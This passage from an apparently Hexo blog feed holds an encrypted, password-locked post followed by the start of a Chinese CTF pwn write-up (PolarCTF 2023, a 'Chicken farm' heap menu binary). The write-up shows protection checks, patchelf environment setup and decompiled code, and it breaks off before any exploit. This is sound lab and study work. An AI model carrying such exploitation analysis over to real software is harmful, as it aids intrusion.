1b608f0e224c587568308d2617e0c8f55266dc02ccc25ec45a22cfd194d8c76fa69505ecd69963b74dfce8bbde6c74e434cebad227f5a24f494b3378537b82a3d5572d66dbf62ea9c25cacfa2d9b4d204b65a0f4c0439b52cefcd44951bdaad5252c46f31a42816c0bf074e545c65d3fc797c1c944daacf9634b01e2761eabdf5306f918af2a0c4b2610298ca96674610e9f97e5b149c224b876967df1f8463fec169bc1ce893b666289da1320d5798bfe835235dad5e35afe68d7ebc0f6c4b17f73903c6ee0d909a7048dea03a2f97898860c22642c3ae223baa81b3ec802b25c521efb75b75953e350a0456445af9d2bfa1d3a58500975359d734137933faac43cf1be0a5b8cdeff261356c8f496391143c54e2f6f700936978774cdbba7fc19b4d018a27cecf2f6960e200e55d596ae1dfc58810520bca738996ebb2e6774dfbdc98f503d1bdb2d7c73e86c87d21acd6acfd8c5db615eb105c0ab034edbb45dca12fc2b2aa44439bdde6d50f434185678dad4657f0993e6dd807e7d325ff474130a6746adb8ecc9235136c3224b7e7a62ae78ac2be7c4afdc5709b917fccfe5a358caf7f93f8712c58dab648d172ebf0823ce07f2775234f73bfecc7cfac5a75a36ab586f06db83ad70b3c2e084118fabf0858f05a0b2dca112b658ef35e213a5abff72ef1c8797ff7c334eb90a9a8b33cbc835c940e5c39e4965b6670844d1ae75be9c710f2355d63532a2fc5f5951e17d050341d72e3c4cf133d66d96f84fba46e0a39c10d70026831090853937f5dce8e79b91fdd06d36ff1621327cdbff4682a38edd2d99e488d1d051222e3f833cd087c1ec1ca41ff490e4bf2e744c826c2027dfd269f5bd7ca3025dfec9c8cc75f2eaec378b7a4eb85fcd09f4ff6a136874c273336bb510ec525e17f1aaa0a3b33210b9ad193599e78798bfae2c6756c55a2e44e631dc92fbacea721bd5180d081831529e52a6842f6ae83f3dc2a878a91b71cb6ba0653e90fdf5eda51e86001fb9a8bd33ba263d1d0fd8d6a4dbfc788be6c097e5e40beb5b4ad8eb9a2a1b102f1fc4c6bf97af280dff87701bb8e838c129785166fff966229c037df99b21400419dd82566c2e06bd7062645c6e2bd387efc813583a96a71425ec3e97b7fb8a4550e90df1b9b5c28c03ee7b482f3cd9be11225d0fe607b5419f75981b27af19e45e32b8bf38fef521a5e4cc81f44cd400ec24f57b500fefd12a330d538df49f09cd8c15a55c5b5ec895f29203b850dadae6dd8f4670aae3777d26a42ea65462bfee22e3f28473bc573cbdff4130babd2ae065651f68417c1b6baa03d646230aaf9189e16432211ac7e9029d1ea2faaac3fa5d4ace2f566c30c6b9da670031e596d82936117fdb9cb66222c63bac8e45c0475c033f428546e5d326b3b20e9c777765f5a836ba4a5e0ffd92a22edb749ace84d4f294a4893f435d8f693300ab18f37bc20421fae7fcbe2bd853dbf2c79463ec2101ba7a9b49f0f182b6b4f227fb67f20cdd3fdf63b81e5f128b6f0111442ded9eec29042a836083c3b1e884bd3ff19927e86e2913c3f796d54bad148315e98e605642c1d4944e8026695557047c973eb3d274964140f5766033aa87696985af213042eb58117ed0037cc80b207c24f21c07c10f2b5bc9d14c484e97d16d58588a19753644e95c6c79d16f344b148fc62e73acb90b624436011d210662e12214dea0a195faf26026e452418880b748b0e7d5cd5ced7c0282e4f941dd7a5f82dc02c3ee74f4a6993a30816282481cdcf495ec48198eb3ea9c24b3b29a937f623d280db56d87c4b79f24d76b65d700a11e6daf3c123679f69ac887603d845a8b6a7ea2d216aaf4d69603d50af6ad8f290ec48968566684d13b151ac7f4f9f639fcfa886afcb70f81146c482b5e585cf223ed2af744176302ef2367e4301605e4a97573380144d77f4f29059a85ff51bbe897de4b51608a939bcdc4ee422b8c3fc922e5a267a4016adc2655256fabcb24950bcc7a16641ce9f98e4548429439fdf9d5ea2ee1251b9ee37f28457999419321b95a58b85a861f04f04e7a1e8d560a0c98d3ccf19837b951009521f8d548b2160aa12520875a5bf47f55888ec2b25ff612db1ff887c28f6e9c0b3d7fb66aa6ee9fef8d1ae0bde30528d977d921826bc720ebe2cb95eb78687ee99362f97cf77f4021940b7b2516407315be93ed20d0547d59737b015f054bfd166a9d146c47d0dcbe5338bcd833f7201133b2bf6dd3a963b50ac8d6aa231d68a1587716935150acba0d2a05162b153531389b1cadb9b13ad02083cd00089b000dfa072f4a38c3a6a0e64b27e6e27e0d08596342e829ef1ba8fa7a20e9db66aa61f89e7f357cbe94c1c1816cea0574192f81004b796b483ea3f3ae76d3314332ff760fddf51d5871a8846b647690db615a132ecd07a23283cc3c134830b7196d64c2b1a39e74f0552b3226eca2d4db0f0d824c072785af92894ef6f6c005caa8c95ca8c3eb458a9d4444960316edefa1e4062ca6e6804f5abea2251cdfd6c7c6d7ce33ec9e5193ad02d702d54062edf4aa0938e9eaffe368aac98c3b17d20d9cafec317c22100b58ea988234ac6a02e3917faf5550c2f69d2b4d20336fb771c319a447ac78882abf1a4f41e49b516ecd736cfc2eb0beb832bd024ad458f6da2f280f4f068d5cbb8c44bc804fc9ad6e0c29e81c9adc1238e0ad203a44db3eea09dcc762f34e8ec14a58a12f3ec84157c56764caf3dd0f1da206a9012e4dc84f28f3237978ebced9ffe23d9b4e4a39e135cfe9526996b8c39d68c0a3db2bf3e56e7eb359363942fd25832d3e81847371b97b99f5e6ba20daab03092ff6206fa5bd0c5b8b2a597597895456dc8c6c30e5f0bbc0c3fc75b94bd059e31f0e235e8675cde7102f29fdc223b78c35b3e53ab12e4362d21524a6b1386b4de0e2d2c2e785e28ef8b12c5b8d66ada3bd59ed9727006cb028f1163d94c63f0917e7ce19a790fb0cbe3de08f326bce73a3d7b5a17f1a09eec3fa818960b8f919b3ea526eb9858d6ddbca8578e1f905fdc1ad04636915483be5c08eb6f4b7f53acf43d566e7954c2c8d8cf04eb33a04b30ad29b2b90c42a18ca5e4a7932ca813e1afedb03936c9672f70d02da965b5290f01d1936f17a50ff2b2dd79eb25ec23e016e20e8fe746c6eb5a2fc2d2876217c82c03fea3870ef52fd4ec5ab836d71344583f326abb4f6f045ab735d2e36caf26d8c38570cbc03f34591593ca8e4ace65f3123b687d74fe61cd57880f8634184aba5e1ba7e7cd30a0e7072785919d8f3b65d8fa1f998d26d798300b954d06a01d5d5cc6ed19b32cc4c4a16d4ba9a464a8c4ff2e253c1abe013fdb6aa26ae0af4b5cede2ab2ff39082e82b4edd412f25256313733ce9e1542cf1c878d2dcd9c388e0b24cace0fe7c864a2176da94371258a343409205b4671928f81a4dff334ba509ed1a67b433cb2411583bfd9b1b48632a29a2629b59e4ab78a2585f5c148cf99f4271a0e3579fa09e61fdbe8341e701b5f8dea5baa4877a3a6c383e7334dcbbae5dd4b4a4d521a53b0488d199a6b9d4d3a85d0c3d6dc5ed24fb0af089f9f91a670d74571d1b363e9d59aad5138c9c0443a7d5a09a5b3485d312195507840fea444c331e428882b45df06c994325876039baad84538f910f5f715943df2bad70723731f2faa752fe2af585e8d41fe47484bd7bff0b921068925a839ad73f033dbfc397aae95024b7634e537fe97e416e6e7528b76008961801e509a52ba8b2ebaf24fd8ee399e1e571978a84cefe6ce63b2656310152faf52b7304aea2c0ff7a939364ea2a890777db9b63242ce0d8f5c60fbe55ac88b15759bc7ca9309e0f45eff6ed0b7617be860015685f73805d9d69424ce23bf2684265b278a24eb5e3d5c20671dd368453aa6a9c4ce4fae3b08943ed09f88a9ca0ec027622ec36abf2f8a16bea05ca6d4ead3b5185fc367650c39b8fd7dbda2c94ccf8e852b27e628947d4ca965ebce8a0eec2222cb9ff1ebde080b2e390d55b80b603dcc91775977fe10a6eb75f808a009a6acaf164afb83e73cec57f03d979ff6c1772690eee674dbae17cc7ddd7bd04051bbafac6dcce8ad72261bf61b61ed7f57c27c8667638900610e1df79eef776b704f8e026db2b521fb519d4893cad1b4a6f6f5b43427e44d9af96451b665d1b9f625beb50789c678230619a3da251c78872ed196a9bac2e7e343e9fd70f0c476cd998171a75f757f16ea6d8965cff7f0c75a40f336ad86ded1257a3708d3f778afc02bbfab2deac8816efa2d8b703a951e175882e5e7344dea15142849bb7dfa774fe7022bb8239cc1f3da8ecebd0596cd1b0cfc834ace1aa72de713634ac505091940c293707d3d6646db4be4e04a2e3eede910b90f04c1759b5d0aa68d12cceff046a3c0c29558004b34a33467688f7dc441ec06b1be452ce4e1b8724c24b2730218fc8cc20c6c843e30208f78cf4b2022432dd9fb911fd6f8f1ab70f82b9133edd7b1d67a257cead426b39ae9803b605d1a84441ae3ac645a54bd65a8dc3c8fc9c350614295707cc447f640e80be18636a243073b0a84b1a301aa36cf6d5c1c1edf321284f825390c93a8a23e853cb363eeb67d3a247ba72e63e094a35ad89c8090f7270ebeabd15f587a4c3d276df59e9e05e3be83d47e32b5ddc8717af780ec20b307b26ae00f70dec948ece68753141d285ac8b9834420b05ea4055e8dd72e41240b74461cffa545f734bf5d5fe9b67dc1ca553367e9869d66167b0e05a4a3bb2b1594473f751ee89d203392d5adbf0bcd55150e9e6dd77e22e1e30859f0fd2b2e4f9c3dd3303650be2b7e151e561730b06fe99332a7b1bf48c7581850a265e0bf4aaf17d94ca2eaae2b8ed444ffce7102cc871737f64a092f028c987e8e1851bcbf6a35af1c2464cfc0629c795d8b170bac29bf1e166fe4e4ff17c1a1df7477352611777d898f407f1597c99af07ca3ed682647641a5c8d4d52b5bfd92555741dcb05b8b08d4b419f6480f78d1423ce81b0a9400cf5668266b8de4f3a032cf80cb1478601a1718d6375a55fdd07be8f2a361613f5a52c7803f79b9f9e74bffe2bdbb454da82a150f97badd6b77082b46719f180ea53335e27fc2268774052125a5c531780e2fe067ef49c25a4af10f270014dbe2de24f17c0f5328202f46592a95f93b1d33e25051100eb3c53c47047cc86af311568f4c68ea097e555d2fe792ace5efaaf35b7a3c4f97b8222abd6cffa648d1a3036dd413c0fea4a25ede95c04c49a497439a861486f82399986e361c71df869685fb9dac55a50c7c398db62946037d73106ff1961dbd27dc5ab086347ec80a5f2199b23ba16644f58619323484fa45cf24d2723c11c2437551b2299b69b5f44fb01be35255fe066a572730fae156158f19a884167dfe94656df62e23eb140310abe067f5b11a305f8380ad529652084da4f8d6bf4eca31c469f0799f33237aa39751953337795aee6f40774a4099aeb766b1fb2492c4ccf77f5af650d2f5bbe37cc3eea3a6aae63d047f833c9a1b4e2f897cd15776f0343063a3b7cc73395c1d3ed8e7b97165b10e41053aceb886589c8ce61349f952cc762ca34cae2e00d8fac65ee3c95a774615e8ed4b6e31f4e8e0801ada3060a1c15f73330cb3f8483649c3dcb3f092a819b07663f6b1891e778935f29e4b0093947b9bc418efa8383e8f6372cc40afb2e93547fc3250d9c94174086fcf16bdbc25c5fbe988f9b8392b1b54140ac9049eca7fbb72464e2e084cefff14d67156a3b2edc16e4a5a6bca8c3f1e018cddae30d33b97808c021558edf2939aab743e11e2f2b180e92d7948983bb8c5021c27ef903a2c150c36fef638a663ec80130d14d00aa914ab704e174c033dbfe64c8145e38f582896e2bcfd68972dca42ac42cb55dadf69321f79654c8927881bc74934de5dba1fc04c4d67638183e19a8c9c54472fcfa2309a59cd756eba2e6050aab565d6eef6eecd0087245bbcb747ce9c609a02a766c708a6b62764c397f985b41fe13dd588bf4c20366c7f03e6aee5125a47edbf6d485c30346882b1d1da8b2c8f363a7264a393242cc8e26e7371ef5338b5879e1cb2e90caa9777f5213a59b9c56704121028833d828ae17048b886c8a81e49bac4c7a31c5acaafdf8be28bab383b16bc747e5d1091ed199c900272e3ef54bc983b25e90ea09add99456864e3369efb38dd6af3526efc3aac79d595b478c1cdda0178043ff0a768bb9a6165b31f59ff7f7144a5c6e8c92fe047fb25fb12b8a1eb67689958e2a59723f1ab09e9a3ec8285fb5ead3133c76cc9c113368de8b0b732bb58b8f68d4e4fce712a63fc1e42f6445eb5ab7317abe0dd124bb6ffa48080437a499c119b81994c371afee04617083effbb965241f505383aff66b55d8cae4dbabd605ecddd451468f84e9e762f32499701aae36a93347adaada0e8f5b6017265a5e41a7aca55613c87ea1f8f468fe2d1bb71457fde8e12e18fbdd2d83ed22a7e47b55c7f7e6a967912ab770d641d8196e4e775517c9ce0df2cfb8e23304ffdfd7f902aa3d348338e6fe68556d910be702d40179b3156b3e005ef9fddd8cf44e7f1e20d18baca5779df39b9ca3ff453502c7f47fb13e13f9cb59df18825fe73c84ec95eb5d17cda0dfbf569963492cd42fba32d1dccc014e50c4119a91c9497280487f63cd97fbe35d3c2ea925920f61e0ccd0759913689d23f6704241b35801ffef80f1eb84219ce311ac03a6d053257a96f589209a1f678e7f9dec1e4ef37a849c0a351c3123b92b7175ce7d84d33a3297be056da4fc44dbb0fa5861421b0bc5668e94ec3329e9bd3a40d06d7f6839b99f55494b48b38ffb4f7f4995132b1a4d31710b8880ab5c1f76f3581e1040f32b8089ecb44216aa64f7b472fceeaf1af44665ea31c4aecbfad4a869e2b5c58e0adadd24d7b964bafe470879d6a2c9ef39497b06a12f6a8f2f910ed8b88e543c7f90259d1f44baf59a1b931c582581843595fec95ff44f03c11bb82f6fa0c764282c99469c06fa5bc5edc3c5198ef01a56bd834db14891377133683a80e957d740b3d0b02ed96ec2b0af652123238d02224043b47731f128416239d955bac19060864fa206db3016d4db95953c895a726bf7efe6104fe05dc9919a63809a0a5d918263e4d444749906ee2f873ff07c83bbf4b9dc9f48fa03d4b62be55ae24a164d183150076220a3e9d7d2ee5a00b6a4bb5bff7bd87172c7643a57906bcd59c77c94b5cc1932186a9023ef74e955cee41da05353deea93c19c877452d0dbc92004b3d3c0a677fdd59367e1c1c8cf8f15c5aa74908f6a2d55cc789f8c27130743fb1a3a9db904de8ed43f9308b80b30167c363865ec20ade821bb2c305cfb42a3e8048eab0adf00069f830d9447c73b53910542cf90d0fa9d6249f57eecbd126bb144a5f796a4a6fa98e5e2cb6812727fd80a597b7a6148a822a2e9564bcae95841eaac5b1b1b0b23f8080348f23ae97f63f1f428e824e8cde4177bcc16366f9053192a31b7675f41bc5aaff70018f5d79d49a3f0c6dd058db999f148ea050097acfedba8632726a5354f7acf4e0421e09506a2bd2e16b70a56616d895bcef7fcc360e6754819474193f030c76693b69e426b56a5fc7ce21dd6a4644879cef50e1d4f981ea5306aa9885b627ab877a81c1187d845213763f71c18647d8dae950d9ec122cebeaab2e67e143580b880cec9dda39e56b94b1735e19bc3bce10c8bc35e32c07c853c847f16da52eb248c2325225e797514197f5e96d76a77ee4508c2945152783baa2425f6d9c651a9c5057b631951ab9f536324d5d1d82a5ea6e895dc27f3ee83cabd56b0dab7157509e4c654c83b3fe0e9100f5e23c5372b7d40752c114f368f1fc2b4702dd470ba484757b43ec34f9d801a0dc797fbf0abb178c2a6e3895317fd58bee5348d209e535d522efeb526e57c70b3debd27ffadf200de2cfcbd2a471330a4d5248ce0df1f8c1b7e04c85f23e7dc366471d98b1382f086fb40b517cc77f9225d7dd91b12fddd67111f3e3a7d96959deaae4ac361f1772303b1a9ab51cd43df5c7cc24677b964be47abc964a86f46ecc8a7e947aff5e63403b141277ddf911c02d0c69513b8883c5034b2ac369b41f0c7e77534a785fab58be59ac59caaa8eacc9524e26acf9f7cc816cdfa49820742fcd84d2057247f23c9f7d286f91c21e1596337639cbee0f915f9ceba46431456211726cd772e0f745a642dce94cd4ce2d7ed7667b21d1c09bcbd026504af682b4e37033b3d58c63b4fc529bb2696b8b6910dc1d7196b25351bb32dd981628daf70933ec4a2ed45026a3129b0dffa3341877d148694e4dcb76f1db68b7b21f20e4eeea8c8940459e64c98ef5d3e81de8be9ec8efb9706560b7331d17f6f1f369ce774a33e3ced27104a5293ff3e67db8b062d0cd5a456f2b07169feabfa08a3884a141efe8e4c069c7a6d315e0cc6db8fccdd6953b30dc9d798d6bd1c601a796a387b48d51994f7770579c4c59f95e5b5eabce1a2f12e6fb9f9d3a368fa09036bd66e436fc420f03e3b70d628d241a7503eada72368e858ae938863d9075f9fee3e0f7645d3fb0d6e2308ba09aa001fd805ae74b49ce3d33688d9d2cec163151d7ee1e3ef8ed9edc5e43ae3bd24ff64bd1f6707a8ca040d8596347f3fc286b7472fe4fae4b710d37e2184fb9b139cbc86a2a2928f84c285d64d8643f17907402737be178a4c6f4eedcc6448f2c1faa0212441306d8da75f00c57e6be288bd7dfcb63276b35a7e337e05d10b01b9d3e5df17081a934da617c7c8f8f3d902c92597b6019b33136ae1c96c89b9c94cf0621c5f96358333db3152ba50f056004c87ffea65e1c7575a834b92de9204cbf18c30573b6cfa848cc0de7d235752a07b44b4a3a032e1e9e69ff139d5aa82ca0b4fcf0275517b779e44d4e1742ac42d7d48b892754fccaca3c479de9d171b83499c0615ca10d86ed53151138de7685502fb32d7d45807bf4f98d321ff3880aa78deacd917370bae6065cce1a6ef2213d9acc3d119acdb9a5f296414bc6d35740809fe047871a06e71b8a041ae9c2cc96ce283fca99e646cae0b68ed048bbedbd0154f6a5fcbd87b82d168ef6ad40e294bebb198997074078642751f9b6cc487e343f0014389d31d66264e4ad2f6255b98e35c3ecf9a5d030ca205cfc6975d853cf739959f2bf3a320819278eec10116ff2b964f89646654e0192fcb2bb1bb84d263ce8a95a41c2af9f3ab15bfe9fb879c0e6ea34e08ac50c1fc0ccc92e2d9ba3e6d5527407e7c5f4d3949857817891e35ec9b3c63ae3216b4eeb40ee9552a6f8388719e7eac5bbe158c16721258d19332644364f2c88ccffe8b33904e859d40aa32d74acef9405b0cf76bce366fd6d62fd1ac9fcd56d2d07121017b8dc4ff853b041214051aadf8410ed4afcb7e2b587aa0322d10be0be43e89e0b4e58daf74c299cf30a1554f7731a21b787f214fc04113323171d44b10c5a2147e6cff267e49bfe0e4884119d70a220a3114dd389a87cf0898e06040b8fc782b67c424557b0ca922490755e2440f25d6fba1e2cd11b63017b9bae49b469fc083666e3e2aed6828adc4cb3f459cba560b7502fb614f958381b3be5730bae5e35dedcb0a83807121474e1cf0ae6dffdead72596fc5f24649721b7056e291da3ab19059004a90c928bd8e7c65d53eb7c0e2e59a1a656d74e34613405879434c153352d0bc54b72ed85ec93946554f1c19d564380c9377e885b3c95ad509c1aca4da80c79f699c65af47bf35948f714f4b3a6a0c301640e33d7ff3b80a4d1611e5b7209f7887e9e077f07afb5a8d2d95f8c3aaba243b2ac8078d3f6b73772a0df6b9bfded6753c33d8e616483fc5bf9125303378952ddf77011c3f749fc77b0b439edef1cadac679107234ccbce55b9737914e6319275f271e4b178c30b1448f6bc21e6dc3db85ec689a2be6bafdbeb97e036486f7117af889e28efa6fa4da5477b9f240ca33c1ecf21fea3acfedca23c4fc5ec794cb6957656fa92f35aa7e329055d3892c4c9e37f50f42b09469489afa112747d375772f675ca2594b0a30c5193c4cfc8f661497162d913a6df7dc0122e4afca28cd571a2763d9aab547ae0bfa877b6e426cdaca4f8b9b936c9b6fbd11fb0f7ecf9987971699b69bcd563acbc2c52ceaee7dd7e9da39cdc24f2b2ee355a8514f065885c06e6246ed8d72130afff8678d87b259f424581611c69a994dc26d5feb323200016c77a9dba9c910bd5f44cb7cf1e61af4a31826c3f4871465ada3a2a8a538d5a3e00b41d31e789a675441bfc14f62c825e502a7429c56eebdafa331e25e8801a7ef6c0f1680d998c69e53135d95d33cda2b10cb5408e8c94a5ba5ac9e0752039eac97f9c870def518a07309fd1fd5a196aa58589010d3cd0b53e8bd3450a70966b78645b4267f1cba5efb0d901af0911582fb5f90b814696dbd6aefd2cf032b735c90c71716142f9892ccaeb95e607b5e11536353f8a96e0c403be9d93726ce60d07477424c610b3464d615f5db176f9792b7f33eabf9c95a2a8e9329000b679aac249f8a75c5bff71d87b4db2354913b8c696533eda6620e352696f578485022c869262c0b0a5b7e1eea5bc5edc23bb46dd246b6e084574592a0534b4212b3c4c68d99a69edb16e5a516aeec5293ce61d24e68e238b785793c0b518c2d2c3dfc8e7a3620120cc19af7a352025933b3fd6c66766ab05089e418c9e5a4c0525527f02d71434f537f2c0e687514011c3abc0e0da7fa9df335c0e03aab94a9fae72fb956aef153a03a5f757a9f38465802158fffe9e763fcbb02c48956030b2615e035ae7c70bb348158b4b39353c85fbe5545d6a4c7f69cda21f940216a0d06d8ae7c387405afba68cb1e7eb6341a5840f3754a151e7938c8e492960eeb73fd2c8e9c7c5db233221f1870e0028cbf25454caf79afd958edb73dc7f0ff11683fdca58d9a5b0d6b8dc23b437fb971ea3eb65b322ffe033ab69dbda0a8cfd71402b11d66fda10f054cbe499b7f5130dcc8e949f9e899bd457e61c94667e3ec9c48ed957afa7539c2ad425477772c92f999f88e549ccf2c8ec867bed24028420099908e5271def698f09151c96df055c5678a1339f948cef9f3bd59bd6957c6cc97e5d3aa13e3f2859c7bf17a44760b6818f8d3c64fe7b9deaf41b3eaf9770ea01f885c71ada97c30615e769ffc65d422f99c284e8261c0dd2b996f1f8ff32097999e5c1fa9e73d6f9c795a04cefc1c7f5cc1861a8748b83496a6d51c52486bab0bd50aefe0786e11255c856ed7a1e3cf71568ccae700f2c5894e9d9ce97122d41da55b8ebd2954d905daa8df97bf1375abaf0265aac4a76e4db2f3d0841021087ce62aa01d2424bfa5ad01bf5726c75e757b989afae97ae61caada14ffd98adbb3a7a983c5eae133051d5433f9f9bbe1bce2694e74199d6683f5fe2cf8da0bd0b85586d990b13746d69e28e726ef6f2385b374c8c049167c4bea005729ac6a4ef94c13cc2cc87672778c99d7c2aded49e7630b3075e59558d85b4d22806dfa4a6b1541270221606b62149d9ff2e7d0bd590e01d51f5665b7dcfefff7ad0e7589797e99150e913effc7fae495612a02f17b9506fd93fbf9d6345eae025bdee21ef56e4fb191c1ea234be599c9a0bc3f7cfb5d888fd526480c1c4e402f27bc58c4e045c136f4ebf660185492bc3dabd38995dab702cd5208798f939e3c2cf82e1e42e31b8cade049c2165dff008b26a673865a1db867db60d8a14e2b6546b64d2a18e68236f1220ad7913ec01ebdb6c0081bebaae9e8a3f8a7f736df6dadf43a85e25941e75df4a7192aac4d4a27655a4dfed00d67a54767cf8e75910cab21be4d40e562c3d9e6c1e7d668975b5b7f00a75e0c458e1e09f83f64eac18c1774fb19cc68674b8e29c519b3928cbeace5e17c19e9d91b0896e9be4c9ddb11b767b49b4730065d88cb79f2bf8756e52f8fae21046fdf49a7088f4ef104419a025af5f69b07b6025c6c79b05cf7c74bf2f88e21c6c2a3f41e0a3156cc5f2dee445d02101f8bf0172692140444dbf776d0d19a1cd7b4e646e394bd39f0364f7d518d021066405cc49320a388a0603b3ca950b00e5ad43cbb6ec73bc86b3127b7fb27836497859e642564a373d146024241ca893f9fc10cf15a15e9a75c40227587f041a662b7ff4f2afda1be687fa63ce8ab738f7f3a21c1ac70540d332790e107595a7466432f02a29d888bdd88adcc2d9ab051fbefa25b8f59f35512e00e525126401fc75a34c097c2c8bae78df179d133f2adc8256e80d00bad0f00dc54a4ce11a4446b9fb89e04d17936ed728d187d15d97e73483b14e553ea9366d689dc3640f0f4e37ddcc2c4bd0cb10001f79c234430421670c16ceb9df62a2ef29e122c999e66fa8b1643460970e0aa5feefd289cb415f1e1752d66a2aa8c48354c39e4bc838d972736cfc7e27d1fae522097f16e2551e68dd2496915d1b1dbc83889cd8a0217639a0e66ed1a8d46cb2e5a5419b07f7e39ca6a6949348015</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT-Start</tag>
      </tags>
  </entry>
  <entry>
    <title>PolarCTF2023秋赛:夕阳下的舞者</title>
    <url>/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/</url>
    <content><![CDATA[<h1 id="562-5Liq5Yiw"><a href="#562-5Liq5Yiw" class="headerlink" title="562+5Liq5Yiw"></a>562+5Liq5Yiw</h1><h2 id="检查文件信息"><a href="#检查文件信息" class="headerlink" title="检查文件信息"></a>检查文件信息</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911180215833.png"
                      alt="image-20230911180215833"
                ></p>
<p><code>ELF64</code>位小端序程序，动态链接。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911180407139.png"
                      alt="image-20230911180407139"
                ></p>
<p>除了<code>FODRTIFY</code>保护，其余保护全开。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 ./libc-2.23.so ./562+5Liq5Yiw</span><br><span class="line">patchelf --set-interpreter ./ld-2.23.so ./562+5Liq5Yiw</span><br></pre></td></tr></table></figure></div>

<p>将环境修改为题目的运行环境。</p>
<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_A9D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Welcome to Chicken farm!!! \x1B[0m&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Add a Chicken.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Delete a Chicken.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Cook a chicken.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.Chicken you are so beautiful.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5.EXIT.&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_A9D()</code>函数为程序菜单。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">sub_A50</span>(a1, a2, a3);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">1uLL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;==:.........................................................................=..::::..=:::::::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;===-:.......................................................................=..=-:=:.=:.:::::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;=====-......................................................................=..-:.=:.=:..::::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;=======:.........................................:..........................=..:--=..=:...:::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;========-:......................................:-=++-......................=..=.:=..=:....::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;==========-....................................:+**###+:....................=-::-----=:......::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;===========-...............................:--:.+######=....................=.-:-:-:.=:.......:::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;:-=========-.............................:+###*:*#+#+*=:...................:=.---:--.=:........::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;:::-=======-............................:######:####+-......................-::::.::.=:.........:\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::--=====-...........................:#++####=+####:.......................:--------..........:\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::--===-...........................#++++++#*-#++##:..........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::-==-..........................*++++++++#:+++++*..........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::--..........................+++++++++#++#++++-.........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::::..........................#++++++++#++#++++=.........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;:::::::::::::.........................=+++++++#+++##+++=.........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;..:::::::::::::........................*+++++#++++++#++:.........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;....:::::::::::::.......................#++++#=++++++#*..........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;......:::::::::::::.....................++*##**#++++#=:..........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;........:::::::::::::..................-==++++++*##*=:...........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;.........:::::::::::::................-======+==+++..............................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;...........:::::::::::::..............-===+++++++++-.............................................\n&quot;</span></span><br><span class="line">    <span 